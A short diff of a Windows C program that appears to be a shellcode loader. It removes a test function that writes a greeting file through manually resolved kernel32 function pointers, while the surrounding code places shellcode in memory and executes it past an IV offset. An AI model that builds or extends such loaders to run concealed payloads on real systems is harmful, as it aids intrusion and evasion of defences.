@@ -272,26 +272,6 @@ void print_minimal(void) {
 }
 
 #include <windows.h>
-typedef const char* LPCSTR;
-typedef const void* LPCVOID;
-typedef DWORD* LPDWORD;
-typedef void* LPSECURITY_ATTRIBUTES;
-//typedef void* LPOVERLAPPED;
-#define CREATE_ALWAYS 2
-#define FILE_ATTRIBUTE_NORMAL 0x80
-#define GENERIC_WRITE 0x40000000
-
-void write_to_file(void) {
-    HANDLE hFile;
-    DWORD bytesWritten;
-    const char data[] = "Hello from kernel32!\n";
-    
-    hFile = ((HANDLE (*)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE)) kernel_library_function_addresses[CREATE_FILE_A_INDEX])("output.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-   
-    ((BOOL (*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED)) kernel_library_function_addresses[WRITE_FILE_INDEX]) (hFile, data, sizeof(data) - 1, &bytesWritten, NULL);
-   
-    ((BOOL (*)(HANDLE)) kernel_library_function_addresses[CLOSE_HANDLE_INDEX])(hFile);
-}
 
 int main(void) {   
     init_kernel_library();
@@ -302,7 +282,7 @@ int main(void) {
     if(placed_shellcode == NULL){
 	return -1;
     }
-    print_minimal();
+    //print_minimal();
     //write_to_file();
     print_minimal();
     shellcode_handling_execute(placed_shellcode + iv_length);
